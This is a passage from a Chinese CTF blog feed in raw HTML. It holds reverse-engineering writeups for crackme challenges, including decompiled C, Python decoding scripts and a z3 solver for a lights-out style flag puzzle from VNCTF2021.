class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">0x14</span>, <span class="number">0x98</span>, <span class="number">0xE6</span>, <span class="number">0x55</span>, <span class="number">0xC8</span>, <span class="number">0xBF</span>, <span class="number">0xAA</span>]</span><br><span class="line"></span><br><span class="line">init = [</span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0xDB</span>, <span class="number">0xA7</span>, <span class="number">0x12</span>, <span class="number">0x89</span>, <span class="number">0xFC</span>, <span class="number">0xEB</span>, <span class="number">0x5B</span>, <span class="number">0xDA</span>, <span class="number">0xA4</span>, </span><br><span class="line">    <span class="number">0x13</span>, <span class="number">0x8E</span>, <span class="number">0xFD</span>, <span class="number">0xF7</span>, <span class="number">0x4B</span>, <span class="number">0xC5</span>, <span class="number">0xA5</span>, <span class="number">0x10</span>, <span class="number">0x8F</span>, <span class="number">0xFA</span>, </span><br><span class="line">    <span class="number">0xE9</span>, <span class="number">0x59</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x7C</span>, <span class="number">0xE3</span>, <span class="number">0x96</span>, <span class="number">0x85</span>, <span class="number">0x3D</span>, <span class="number">0xB3</span>, </span><br><span class="line">    <span class="number">0xCF</span>, <span class="number">0x72</span>, <span class="number">0xD1</span>, <span class="number">0xFF</span>, <span class="number">0xEA</span>, <span class="number">0x54</span>, <span class="number">0xD8</span>, <span class="number">0xA6</span>, <span class="number">0x15</span>, <span class="number">0x88</span>, </span><br><span class="line">    <span class="number">0xFF</span>, <span class="number">0xEA</span>, <span class="number">0x54</span>, <span class="number">0xD8</span>, <span class="number">0xA7</span>, <span class="number">0x16</span>, <span class="number">0x89</span>, <span class="number">0xE0</span>, <span class="number">0xEB</span>, <span class="number">0x57</span>, </span><br><span class="line">    <span class="number">0xD9</span>, <span class="number">0xA1</span>, <span class="number">0x14</span>, <span class="number">0x8B</span>, <span class="number">0xFE</span>, <span class="number">0xE5</span>, <span class="number">0x55</span>, <span class="number">0xDB</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">true_table = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(init)):</span><br><span class="line">    init[i] ^= key[i % <span class="number">7</span>] ^ i</span><br><span class="line">    true_table += <span class="string">&#x27;%c&#x27;</span> % init[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base58 <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">&#x27;4VyhuTqRfYFnQ85Bcw5XcDr3ScNBjf5CzwUdWKVM7SSVqBrkvYGt7SSUJe&#x27;</span></span><br><span class="line">fake_table = <span class="string">&#x27;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&#x27;</span></span><br><span class="line">true_flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    true_flag += fake_table[true_table.index(flag[i])]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (b58decode(true_flag))</span><br><span class="line"><span class="comment"># b&#x27;\x06flag&#123;63510cf7-2b80-45e1-a186-21234897e5cd&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>得到flag</p><blockquote><p>拿到flag之后用程序验证，结果发现没有通过，以为自己只在第一层，base58分析错了，于是从头认真读代码<br>最后上网看了wp，才发现flag就是过不了验证</p></blockquote><h1 id="easyparser"><a href="#easyparser" class="headerlink" title="easyparser"></a>easyparser</h1><p>见过的最大的VM了，边动调边读指令</p><p>先是一堆初始化，直接动调过去，找输入</p><p>发现用了个循环，先将输入放到一个地址里</p><p>判断最后一个是否为 <code>&#125;</code></p><p>然后，将输入的一部分取出，存到了某个地址+0xE1到+0x100，正好32位</p><p>然后判断一下头是不是 <code>flag&#123;</code></p><p>接下来又进入一个循环，发现将某个地址的数字取出，存到了7号寄存器中，然后将对应位的输入取出，存到6号寄存器中</p><p>对6号寄存器分别进行了 <code>^0x63</code> 和 <code>&lt;&lt;2</code> 两个指令</p><p>然后和7号寄存器进行比较</p><p>猜测对所有明文都进行了同样的加密，所以直接从地址中取出密文，解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cipher = [<span class="number">144</span>,<span class="number">332</span>,<span class="number">28</span>,<span class="number">240</span>,<span class="number">132</span>,<span class="number">60</span>,<span class="number">24</span>,<span class="number">64</span>,<span class="number">64</span>,<span class="number">240</span>,<span class="number">208</span>,<span class="number">88</span>,<span class="number">44</span>,<span class="number">8</span>,<span class="number">52</span>,<span class="number">240</span>,<span class="number">276</span>,<span class="number">240</span>,<span class="number">128</span>,<span class="number">44</span>,<span class="number">40</span>,<span class="number">52</span>,<span class="number">8</span>,<span class="number">240</span>,<span class="number">144</span>,<span class="number">68</span>,<span class="number">48</span>,<span class="number">80</span>,<span class="number">92</span>,<span class="number">44</span>,<span class="number">264</span>,<span class="number">240</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cipher:</span><br><span class="line">    <span class="built_in">print</span> (<span class="built_in">chr</span>((c &gt;&gt; <span class="number">2</span>) ^ <span class="number">0x63</span>), end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> ()</span><br><span class="line"><span class="comment"># G0d_Bless_Wuhan_&amp;_China_Growth!_</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;完成：cycle graph, 天津垓, fxck, easyparser&lt;/p&gt;
&lt;p&gt;被学长安利的比赛&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/categories/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/categories/CTF/Reverse/"/>
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/tags/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>VNCTF2021 re FilpGame</title>
    <link href="https://s0uthwood.github.io/2021/03/25/VNCTF2021-re-FilpGame/"/>
    <id>https://s0uthwood.github.io/2021/03/25/VNCTF2021-re-FilpGame/</id>
    <published>2021-03-24T19:06:10.000Z</published>
    <updated>2021-05-19T17:47:01.540Z</updated>
    
    <content type="html"><![CDATA[<p>V&amp;NCTF2021 补题第二篇</p><p>官方WP写的好玄学，其实用z3也可以解的</p><a id="more"></a><h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><p>拖入ida，通过字符串定位到关键代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">  sub_401020(<span class="string">&quot;Input: &quot;</span>);</span><br><span class="line">  sub_401050(<span class="string">&quot;%s&quot;</span>, inputstring, <span class="number">512</span>);</span><br><span class="line">  v0 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( inputstring[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = dword_403398;</span><br><span class="line">    v2 = dword_40339C;</span><br><span class="line">    v14 = dword_403398;</span><br><span class="line">    <span class="keyword">while</span> ( v0 &lt; <span class="number">214</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = v0;</span><br><span class="line">      v4 = &amp;inputstring[v0];</span><br><span class="line">      v5 = v3 &amp; <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v5 )                                 <span class="comment">// 第奇数位</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = *v4;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(*v4 - <span class="string">&#x27;0&#x27;</span>) &gt; <span class="number">9u</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(v6 - <span class="string">&#x27;A&#x27;</span>) &gt; <span class="number">0x19</span>u )<span class="comment">// 大于大写字母时</span></span><br><span class="line">          &#123;</span><br><span class="line">            v2 = <span class="number">-1</span>;</span><br><span class="line">            dword_40339C = <span class="number">-1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span>                                  <span class="comment">// 大写字母时</span></span><br><span class="line">          &#123;</span><br><span class="line">            v2 = v6 - <span class="string">&#x27;7&#x27;</span>;</span><br><span class="line">            dword_40339C = v6 - <span class="string">&#x27;7&#x27;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>                                    <span class="comment">// 为数字时</span></span><br><span class="line">        &#123;</span><br><span class="line">          v2 = v6 - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">          dword_40339C = v6 - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                      <span class="comment">// 偶数位</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 = *v4;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(*v4 - <span class="string">&#x27;0&#x27;</span>) &gt; <span class="number">9u</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(v7 - <span class="string">&#x27;A&#x27;</span>) &gt; <span class="number">0x19</span>u )</span><br><span class="line">          &#123;</span><br><span class="line">            dword_403398 = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          v1 = v7 - <span class="string">&#x27;7&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v1 = v7 - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        dword_403398 = v1;</span><br><span class="line">        v14 = v1;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v1 &gt; <span class="number">0xF</span> || v2 &gt; <span class="number">0xF</span> )               <span class="comment">// 不能大于F</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v5 )                                 <span class="comment">// 奇数时，两位两位进行计算</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( dword_403018 &gt;= (<span class="keyword">signed</span> <span class="keyword">int</span>)(v1 + <span class="number">16</span> * v2) )<span class="comment">// 0FFFFFFFF</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        dword_403018 = v1 + <span class="number">16</span> * v2;            <span class="comment">// v1为列，v2为行</span></span><br><span class="line">        v8 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v9 = v1 + dword_40212C[v8];           <span class="comment">// -1  0  0  0  1 先输入的数</span></span><br><span class="line">          v10 = v2 + dword_402140[v8];          <span class="comment">//  0  0 -1  1  0 后输入的数</span></span><br><span class="line">          <span class="keyword">if</span> ( v9 &lt;= <span class="number">0xF</span> &amp;&amp; v10 &lt;= <span class="number">0xF</span> )</span><br><span class="line">            final_check[v10] ^= <span class="number">1</span> &lt;&lt; (<span class="number">15</span> - v9); <span class="comment">// 将所选位置及周围一圈的数字都进行取反，位置用大写十六进制表示</span></span><br><span class="line">          v1 = v14;</span><br><span class="line">          ++v8;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v8 &lt; <span class="number">5</span> );</span><br><span class="line">      &#125;</span><br><span class="line">      v0 = v13 + <span class="number">1</span>;</span><br><span class="line">      v13 = v0;</span><br><span class="line">      <span class="keyword">if</span> ( !inputstring[v0] )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_25:</span><br><span class="line">    v11 = final_check;                          <span class="comment">// 目标：均为-1</span></span><br><span class="line">    <span class="keyword">while</span> ( *v11 == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v11;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v11 &gt;= (<span class="keyword">signed</span> <span class="keyword">int</span>)&amp;unk_40303C )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_401020(<span class="string">&quot;right, vnctf&#123;MD5(%s)&#125;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401020(<span class="string">&quot;wrong\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h1 id="脚本求解"><a href="#脚本求解" class="headerlink" title="脚本求解"></a>脚本求解</h1><p>简单的说就是已知一个 $16\times 16$ 的 $01$ 方阵，每次对一个格子取反，都会对相邻的四个格子同样进行取反，最终求解一个操作顺序使得所有的数字为 $1$。</p><p>一开始写了个回溯，然后直接炸了。</p><p>经过队友的提醒开始用z3求解（<del>队友的z3还是从我这里学的。。。</del>），但没想到踩到了好多坑，也学会了一些z3的新用法。</p><p>直接上最后的代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">init_check = [</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">posx = [<span class="number">0</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line">posy = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line">change = [ [BitVec(<span class="string">&#x27;change%x%x&#x27;</span> % (i, j), <span class="number">2</span>) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>) ]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            <span class="keyword">if</span> i + posx[k] &gt;= <span class="number">0</span> <span class="keyword">and</span> i + posx[k] &lt; <span class="number">16</span> <span class="keyword">and</span> j + posy[k] &gt;= <span class="number">0</span> <span class="keyword">and</span> j + posy[k] &lt; <span class="number">16</span>:</span><br><span class="line">                init_check[i][j] ^= (change[i + posx[k]][j + posy[k]])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        solver.add(change[i][j] &amp; <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        solver.add(init_check[i][j] == <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> solver.check() == sat:</span><br><span class="line">    length = <span class="number">0</span></span><br><span class="line">    model = solver.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            <span class="keyword">if</span> model[change[i][j]] == <span class="number">1</span>:</span><br><span class="line">                length += <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> length &lt; <span class="number">220</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">                <span class="keyword">if</span> model[change[i][j]] == <span class="number">1</span>:</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&#x27;%X%X&#x27;</span> % (j, i), end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> ()</span><br><span class="line">    condition = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            condition.append(change[i][j] != <span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span> % (model[change[i][j]])))</span><br><span class="line">    solver.add(Or(condition))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;\nfinish&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> FilpGame python3 solve.py</span></span><br><span class="line">2050608090A0B0C0D02131417191A1B1527282B2D2E2F213234363B3D36494C4D4E415456575C5D5E50626566686C6F6071787B7C72838587898C8D81949596999B9C9F95A8AAAEA0B1B3B4B7B1C2C3C4C6C9CBCEC0D4D7D9DBDCDED0E1E3E4E5E6E8E9ECEEEFE3F7F8FBF</span><br><span class="line"></span><br><span class="line">finish</span><br></pre></td></tr></table></figure><p>过程中踩到的坑：</p><ol><li>这道题的行和列很绕，一定要看清楚；</li><li>不知道为什么，<code>BitVec</code> 大小不能设置成 $1$；</li><li>这题的解有很多，所以最后需要用一个 <code>condition</code> 和 <code>Or</code> 来找到所有的解；</li><li>如果对数没有最基本的约束的话，可能会出现一堆 <code>None</code> 的情况。</li></ol><p>程序运行结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> FilpGame ./FilpGame.exe</span></span><br><span class="line">Input: 2050608090A0B0C0D02131417191A1B1527282B2D2E2F213234363B3D36494C4D4E415456575C5D5E50626566686C6F6071787B7C72838587898C8D81949596999</span><br><span class="line">B9C9F95A8AAAEA0B1B3B4B7B1C2C3C4C6C9CBCEC0D4D7D9DBDCDED0E1E3E4E5E6E8E9ECEEEFE3F7F8FBF</span><br><span class="line">right, vnctf&#123;MD5(2050608090A0B0C0D02131417191A1B1527282B2D2E2F213234363B3D36494C4D4E415456575C5D5E50626566686C6F6071787B7C72838587898C8D8</span><br><span class="line">1949596999B9C9F95A8AAAEA0B1B3B4B7B1C2C3C4C6C9CBCEC0D4D7D9DBDCDED0E1E3E4E5E6E8E9ECEEEFE3F7F8FBF)&#125;</span><br></pre></td></tr></table></figure><p>最后算一下md5</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hl = 